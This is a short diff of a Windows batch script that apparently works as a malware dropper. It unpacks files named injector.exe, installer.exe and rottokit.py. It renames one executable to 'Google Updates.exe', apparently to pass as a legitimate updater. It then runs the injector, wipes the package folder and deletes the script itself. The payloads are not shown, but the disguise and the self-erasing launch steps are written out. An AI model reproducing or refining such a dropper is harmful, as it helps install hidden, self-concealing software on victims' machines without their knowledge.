@@ -34,9 +34,8 @@ GOTO CheckForFile2
 :FoundIt2
 
 move "Packages\injector.exe"  "injector.exe"
-move "Packages\Google Docs.exe"  "Google Docs.exe"
+move "Packages\Google Updates.exe"  "Google Updates.exe"
 move "Packages\installer.exe"  "installer.exe"
-move "Packages\pythonw.exe"  "pythonw.exe"
 move "Packages\rottokit.py"  "rottokit.py"
 move "Packages\diagnostics.zip"  "diagnostics.zip"
 
@@ -44,11 +43,9 @@ timeout /t 1
 rmdir /S /Q "Packages"
 timeout /t 1
 
-"injector.exe" 1
+"injector.exe"
 del /f %Packages%
 del /f "%~dp0%~nx0"
-
-
 
 
 
